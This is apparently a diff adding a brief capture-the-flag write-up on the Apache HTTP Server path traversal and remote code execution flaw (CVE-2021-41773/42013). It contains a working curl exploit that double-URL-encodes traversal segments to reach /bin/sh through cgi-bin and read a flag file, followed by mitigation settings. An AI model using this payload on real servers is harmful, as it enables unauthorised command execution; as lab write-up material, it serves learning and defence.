@@ -1,0 +1,21 @@
+Read
+https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013
+
+and recognize that the problem comes from `cgi-bin`
+
+then construct this by double URL encode the access path
+```
+curl -X POST "http://123.57.35.201:33012/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh" \
+--data-binary "echo;cat /flag"
+```
+got the flag
+
+and follow the suggestion:
+```
+
+mod_cgi module is disabled by default unless the business requires it.
+filesystem directory directive to be updated with Require all denied as show below:
+<Directory />
+    Require all denied
+</Directory>
+```
